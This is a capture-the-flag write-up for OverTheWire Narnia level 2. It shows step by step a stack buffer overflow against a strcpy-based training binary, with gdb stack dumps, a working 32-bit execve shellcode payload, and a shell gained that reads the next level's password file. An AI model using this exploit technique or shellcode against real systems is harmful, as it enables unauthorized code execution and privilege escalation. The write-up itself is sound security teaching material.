#Narnia2

narnia.labs.overthewire.org

**Username:** narnia2
**Password:** see [narnia1](https://github.com/Alpackers/CTF-Writeups/tree/master/Misc/OverTheWire/Narnia/Naria1)
**Description:**  
> This wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we've tried to make them easy to exploit. You'll get the source code of each level to make it easier for you to spot the vuln and abuse it.  

##Write-up

> Again, let's go ahead and run the program and see what it does.
>
>```
># ./narnia2 
>Usage: ./narnia2 argument
># ./narnia2 Testing
>Testing
>```
> It looks like it is just echoing our input.
>
> Let's see what the source code looks like:
>
>```C
>/*
>    This program is free software; you can redistribute it and/or modify
>    it under the terms of the GNU General Public License as published by
>    the Free Software Foundation; either version 2 of the License, or
>    (at your option) any later version.
>
>    This program is distributed in the hope that it will be useful,
>    but WITHOUT ANY WARRANTY; without even the implied warranty of
>    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
>    GNU General Public License for more details.
>
>    You should have received a copy of the GNU General Public License
>    along with this program; if not, write to the Free Software
>    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
>*/
>#include <stdio.h>
>#include <string.h>
>#include <stdlib.h>
>
>int main(int argc, char * argv[]){
>	char buf[128];
>
>	if(argc == 1){
>		printf("Usage: %s argument\n", argv[0]);
>		exit(1);
>	}
>	strcpy(buf,argv[1]);
>	printf("%s", buf);
>
>	return 0;
>}
>```
>
> This looks pretty straight forward.  We accepting input via command line and copying that parameter into a character array of length 128.  Lets fuzz around that number a little bit and see what we get.
>
>```
># ./narnia2 $(python -c 'print "A"*128')
>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
>root@kali:~# ./narnia2 $(python -c 'print "A"*135')
>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
>root@kali:~# ./narnia2 $(python -c 'print "A"*150')
>Segmentation fault
>```
>
> Ok, Seg fault at 150 characters but not 135.  Let's get gdb up and running and try a few more to narrow it down to a specific value.
>
>```
># gdb narnia2
>(gdb) run $(python -c 'print "A"*150')
>Starting program: /root/narnia2 $(python -c 'print "A"*150')
>warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
>
>Program received signal SIGSEGV, Segmentation fault.
>0x41414141 in ?? ()
>(gdb) c
>Continuing.
>
>Program terminated with signal SIGSEGV, Segmentation fault.
>The program no longer exists.
>(gdb) run $(python -c 'print "A"*140')
>Starting program: /root/narnia2 $(python -c 'print "A"*140')
>warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
>
>Program received signal SIGSEGV, Segmentation fault.
>0xf7e81416 in _setjmp () from /lib/i386-linux-gnu/i686/cmov/libc.so.6
>(gdb) c
>Continuing.
>
>Program terminated with signal SIGSEGV, Segmentation fault.
>The program no longer exists.
>(gdb) run $(python -c 'print "A"*142')
>Starting program: /root/narnia2 $(python -c 'print "A"*142')
>warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
>
>Program received signal SIGSEGV, Segmentation fault.
>0xf7004141 in ?? ()
>(gdb) c
>Continuing.
>
>Program terminated with signal SIGSEGV, Segmentation fault.
>The program no longer exists.
>(gdb) run $(python -c 'print "A"*144')
>Starting program: /root/narnia2 $(python -c 'print "A"*144')
>
>Program received signal SIGSEGV, Segmentation fault.
>0x41414141 in ?? ()
>```
>
> At 142 characters we start seeing the ```A``` in the last two positions.  Adding two more, we have now completely overwritten that return address with ```A```. Let's see if we can pinpoint the actual address we are affecting.  Again, back to gdb.
>
>```asm
># gdb narnia2
>(gdb) run $(python -c 'print "A"*144')
>Starting program: /root/narnia2 $(python -c 'print "A"*144')
>warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
>
>Program received signal SIGSEGV, Segmentation fault.
>0x41414141 in ?? ()
>(gdb) x/300x $esp
>0xffffd480:	0x00000000	0xffffd524	0xffffd530	0xf7fdb860
>0xffffd490:	0xf7ff4821	0xffffffff	0xf7ffcff4	0x08048249
>0xffffd4a0:	0x00000001	0xffffd4e0	0xf7fedc16	0xf7ffdac0
>0xffffd4b0:	0xf7fdbb58	0xf7fb6ff4	0x00000000	0x00000000
>0xffffd4c0:	0xffffd4f8	0x88a8c4b2	0xbabdd2a2	0x00000000
>0xffffd4d0:	0x00000000	0x00000000	0x00000002	0x08048360
>0xffffd4e0:	0x00000000	0xf7ff39c0	0xf7e6dd6b	0xf7ffcff4
>0xffffd4f0:	0x00000002	0x08048360	0x00000000	0x08048381
>0xffffd500:	0x0804845d	0x00000002	0xffffd524	0x080484d0
>0xffffd510:	0x08048540	0xf7fee590	0xffffd51c	0xf7ffd908
>0xffffd520:	0x00000002	0xffffd674	0xffffd682	0x00000000
>0xffffd530:	0xffffd713	0xffffd726	0xffffd759	0xffffd764
>0xffffd540:	0xffffd774	0xffffd7c5	0xffffd7d7	0xffffd809
>0xffffd550:	0xffffd813	0xffffdd34	0xffffdd62	0xffffddb0
>0xffffd560:	0xffffddbe	0xffffddc9	0xffffdde1	0xffffde23
>0xffffd570:	0xffffde32	0xffffde3c	0xffffde4d	0xffffde64
>0xffffd580:	0xffffde79	0xffffde82	0xffffde95	0xffffdea0
>0xffffd590:	0xffffdea8	0xffffded4	0xffffdee1	0xffffdf43
>0xffffd5a0:	0xffffdf80	0xffffdf8d	0xffffdf9a	0xffffdfb3
>0xffffd5b0:	0x00000000	0x00000020	0xf7fded00	0x00000021
>0xffffd5c0:	0xf7fde000	0x00000010	0x0fabfbff	0x00000006
>0xffffd5d0:	0x00001000	0x00000011	0x00000064	0x00000003
>0xffffd5e0:	0x08048034	0x00000004	0x00000020	0x00000005
>0xffffd5f0:	0x00000008	0x00000007	0xf7fe0000	0x00000008
>0xffffd600:	0x00000000	0x00000009	0x08048360	0x0000000b
>0xffffd610:	0x00000000	0x0000000c	0x00000000	0x0000000d
>0xffffd620:	0x00000000	0x0000000e	0x00000000	0x00000017
>0xffffd630:	0x00000000	0x00000019	0xffffd65b	0x0000001f
>0xffffd640:	0xffffdfea	0x0000000f	0xffffd66b	0x00000000
>0xffffd650:	0x00000000	0x00000000	0x2c000000	0xe21e02b3
>0xffffd660:	0x27a6bb80	0x7bd9c3b3	0x69d37a93	0x00363836
>0xffffd670:	0x00000000	0x6f6f722f	0x616e2f74	0x61696e72
>0xffffd680:	0x41410032	0x41414141	0x41414141	0x41414141
>0xffffd690:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd6a0:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd6b0:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd6c0:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd6d0:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd6e0:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd6f0:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd700:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd710:	0x53004141	0x415f4853	0x544e4547	0x4449505f
>0xffffd720:	0x3439333d	0x50470030	0x47415f47	0x5f544e45
>0xffffd730:	0x4f464e49	0x6f722f3d	0x2e2f746f	0x68636163
>```
>
> We can see our ```A``` come in towards the bottom.  Let's try to go ahead and try to dump our shellcode in as part of our input and point the return back to the begining of it.  We'll reuse the shellcode from the last challenge, which was 28 bytes.  We also need 4 bytes for the return.  Let's see if we can get a good address to return to.
>
>```asm
>(gdb) run $(python -c 'print "A"*112+"R"*28+"AAAA"')
>The program being debugged has been started already.
>Start it from the beginning? (y or n) y
>
>Starting program: /root/narnia2 $(python -c 'print "A"*112+"R"*28+"AAAA"')
>warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
>
>Program received signal SIGSEGV, Segmentation fault.
>0x41414141 in ?? ()
>(gdb) x/300x $esp
>0xffffd480:	0x00000000	0xffffd524	0xffffd530	0xf7fdb860
>0xffffd490:	0xf7ff4821	0xffffffff	0xf7ffcff4	0x08048249
>0xffffd4a0:	0x00000001	0xffffd4e0	0xf7fedc16	0xf7ffdac0
>0xffffd4b0:	0xf7fdbb58	0xf7fb6ff4	0x00000000	0x00000000
>0xffffd4c0:	0xffffd4f8	0x5b801364	0x69950574	0x00000000
>0xffffd4d0:	0x00000000	0x00000000	0x00000002	0x08048360
>0xffffd4e0:	0x00000000	0xf7ff39c0	0xf7e6dd6b	0xf7ffcff4
>0xffffd4f0:	0x00000002	0x08048360	0x00000000	0x08048381
>0xffffd500:	0x0804845d	0x00000002	0xffffd524	0x080484d0
>0xffffd510:	0x08048540	0xf7fee590	0xffffd51c	0xf7ffd908
>0xffffd520:	0x00000002	0xffffd674	0xffffd682	0x00000000
>0xffffd530:	0xffffd713	0xffffd726	0xffffd759	0xffffd764
>0xffffd540:	0xffffd774	0xffffd7c5	0xffffd7d7	0xffffd809
>0xffffd550:	0xffffd813	0xffffdd34	0xffffdd62	0xffffddb0
>0xffffd560:	0xffffddbe	0xffffddc9	0xffffdde1	0xffffde23
>0xffffd570:	0xffffde32	0xffffde3c	0xffffde4d	0xffffde64
>0xffffd580:	0xffffde79	0xffffde82	0xffffde95	0xffffdea0
>0xffffd590:	0xffffdea8	0xffffded4	0xffffdee1	0xffffdf43
>0xffffd5a0:	0xffffdf80	0xffffdf8d	0xffffdf9a	0xffffdfb3
>0xffffd5b0:	0x00000000	0x00000020	0xf7fded00	0x00000021
>0xffffd5c0:	0xf7fde000	0x00000010	0x0fabfbff	0x00000006
>0xffffd5d0:	0x00001000	0x00000011	0x00000064	0x00000003
>0xffffd5e0:	0x08048034	0x00000004	0x00000020	0x00000005
>0xffffd5f0:	0x00000008	0x00000007	0xf7fe0000	0x00000008
>0xffffd600:	0x00000000	0x00000009	0x08048360	0x0000000b
>0xffffd610:	0x00000000	0x0000000c	0x00000000	0x0000000d
>0xffffd620:	0x00000000	0x0000000e	0x00000000	0x00000017
>0xffffd630:	0x00000000	0x00000019	0xffffd65b	0x0000001f
>0xffffd640:	0xffffdfea	0x0000000f	0xffffd66b	0x00000000
>0xffffd650:	0x00000000	0x00000000	0xd4000000	0x89a623a1
>0xffffd660:	0x2d4dd214	0x1ea663aa	0x69553644	0x00363836
>0xffffd670:	0x00000000	0x6f6f722f	0x616e2f74	0x61696e72
>0xffffd680:	0x41410032	0x41414141	0x41414141	0x41414141
>0xffffd690:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd6a0:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd6b0:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd6c0:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd6d0:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd6e0:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd6f0:	0x52524141	0x52525252	0x52525252	0x52525252
>0xffffd700:	0x52525252	0x52525252	0x52525252	0x41415252
>0xffffd710:	0x53004141	0x415f4853	0x544e4547	0x4449505f
>0xffffd720:	0x3439333d	0x50470030	0x47415f47	0x5f544e45
>0xffffd730:	0x4f464e49	0x6f722f3d	0x2e2f746f	0x68636163
>```
>
> Now let's take the ```R``` and replace them with the shellcode and then point back to ```0xffffd6f0``` where we see the begining of those ```R``` returning.
>
>```
>(gdb) run $(python -c 'print "A"*112+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"\xf0\xd6\xff\xff"')
>Starting program: /root/narnia2 $(python -c 'print "A"*112+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"\xf0\xd6\xff\xff"')
>warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
>process 50581 is executing new program: /bin/dash
>warning: Selected architecture i386:x86-64 is not compatible with reported target architecture i386
>Architecture of file not recognized.
>```
>
> Busted. It looks like it tried to execute our shellcode, but I'm running this on a 64-bit machine and our shellcode was made for a 32-bit.
>
>```
># file narnia2 
>narnia2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x0c45d7047b18ac015ea5c89b1fe8cb19b1d7eee1, not stripped
>```
>
> Let's swing on over to the server and give it a try.
>
>```
>narnia2@melinda:/narnia$ ./narnia2 $(python -c 'print "A"*112+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"\xf0\xd6\xff\xff"')
>Segmentation fault
>```
>
> Ok, so I may need to remap things a bit, let's go back to gdb and see if we can find a new address.
>
>```asm
>narnia2@melinda:/narnia$ gdb narnia2
>(gdb) run $(python -c 'print "A"*112+"R"*28+"AAAA"')
>Starting program: /games/narnia/narnia2 $(python -c 'print "A"*112+"R"*28+"AAAA"')
>
>Program received signal SIGSEGV, Segmentation fault.
>0x41414141 in ?? ()
>(gdb) x/300x $esp
>0xffffd660:	0x00000000	0xffffd6f4	0xffffd700	0xf7feacea
>0xffffd670:	0x00000002	0xffffd6f4	0xffffd694	0x08049768
>0xffffd680:	0x0804821c	0xf7fca000	0x00000000	0x00000000
>0xffffd690:	0x00000000	0x0ef25302	0x36cad712	0x00000000
>0xffffd6a0:	0x00000000	0x00000000	0x00000002	0x08048360
>0xffffd6b0:	0x00000000	0xf7ff0500	0xf7e3c979	0xf7ffd000
>0xffffd6c0:	0x00000002	0x08048360	0x00000000	0x08048381
>0xffffd6d0:	0x0804845d	0x00000002	0xffffd6f4	0x080484d0
>0xffffd6e0:	0x08048540	0xf7feb180	0xffffd6ec	0x0000001c
>0xffffd6f0:	0x00000002	0xffffd820	0xffffd836	0x00000000
>0xffffd700:	0xffffd8c7	0xffffd8dc	0xffffd8ec	0xffffd8f7
>0xffffd710:	0xffffd917	0xffffd92b	0xffffd934	0xffffd941
>0xffffd720:	0xffffde62	0xffffde6d	0xffffde78	0xffffded6
>0xffffd730:	0xffffdeed	0xffffdefc	0xffffdf08	0xffffdf19
>0xffffd740:	0xffffdf22	0xffffdf35	0xffffdf3d	0xffffdf4d
>0xffffd750:	0xffffdf80	0xffffdfa0	0xffffdfc0	0x00000000
>0xffffd760:	0x00000020	0xf7fdbb20	0x00000021	0xf7fdb000
>0xffffd770:	0x00000010	0x1f898b75	0x00000006	0x00001000
>0xffffd780:	0x00000011	0x00000064	0x00000003	0x08048034
>0xffffd790:	0x00000004	0x00000020	0x00000005	0x00000008
>0xffffd7a0:	0x00000007	0xf7fdc000	0x00000008	0x00000000
>0xffffd7b0:	0x00000009	0x08048360	0x0000000b	0x000036b2
>0xffffd7c0:	0x0000000c	0x000036b2	0x0000000d	0x000036b2
>0xffffd7d0:	0x0000000e	0x000036b2	0x00000017	0x00000000
>0xffffd7e0:	0x00000019	0xffffd80b	0x0000001f	0xffffdfe2
>0xffffd7f0:	0x0000000f	0xffffd81b	0x00000000	0x00000000
>0xffffd800:	0x00000000	0x00000000	0x42000000	0x49b1fc36
>0xffffd810:	0xb27ef8af	0x436bc3ff	0x699118bb	0x00363836
>0xffffd820:	0x6d61672f	0x6e2f7365	0x696e7261	0x616e2f61
>0xffffd830:	0x61696e72	0x41410032	0x41414141	0x41414141
>0xffffd840:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd850:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd860:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd870:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd890:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd8a0:	0x41414141	0x52524141	0x52525252	0x52525252
>0xffffd8b0:	0x52525252	0x52525252	0x52525252	0x52525252
>0xffffd8c0:	0x41415252	0x58004141	0x535f4744	0x49535345
>0xffffd8d0:	0x495f4e4f	0x39333d44	0x00333535	0x4c454853
>0xffffd8e0:	0x622f3d4c	0x622f6e69	0x00687361	0x4d524554
>0xffffd8f0:	0x6574783d	0x53006d72	0x435f4853	0x4e45494c
>0xffffd900:	0x38363d54	0x352e312e	0x30322e38	0x38332032
>0xffffd910:	0x20393339	0x53003232	0x545f4853	0x2f3d5954
>```
>
> Looks like we need to switch out return address to ```0xffffd8a0```.  Let's try real fast.
>
>```
>narnia2@melinda:/narnia$ ./narnia2 $(python -c 'print "A"*112+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"\xa0\xd8\xff\xff"')
>$ whoami
>narnia3
>$ cat /etc/narnia_pass/narnia3
>**********
>$ 
>```
>
> Ahhh, it's always nice to see that prompt!  Time for narnia3.
